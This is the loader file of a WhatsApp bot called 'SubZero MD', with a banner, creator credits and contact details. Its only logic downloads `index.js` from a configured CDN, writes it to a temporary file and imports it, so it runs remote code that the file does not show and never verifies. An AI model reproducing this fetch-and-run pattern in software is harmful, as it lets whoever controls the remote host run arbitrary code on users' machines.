/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

@ Project Name : SubZero MD
* Creator      : Darrell Mucheri ( Mr Frank OFC )
* My Git       : https//github.com/mrfr8nk
* Contact      : wa.me/263776046121
* Channel      : https://whatsapp.com/channel/0029Vb7D70MI7BeC0xUnKb05
* Release Date : 15 December 2024 12.01 AM
*/

// ZIMBABWEAN STAR ON TOP

import axios from 'axios';
import config from './settings.js';
import fs from 'fs/promises';
import path from 'path';

const TEMP_FILE = './temp.mjs';

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");

    const { data: scriptCode } = await axios.get(
      `${config.CDN}/cdn/index.js`
    );

    // Save remote script temporarily i fear RAM errz
    await fs.writeFile(TEMP_FILE, scriptCode);

    // Import it as ESM since we no longer us cjs..
    await import(path.resolve(TEMP_FILE));

  } catch (err) {
    console.error("Error:", err);
  }
})();
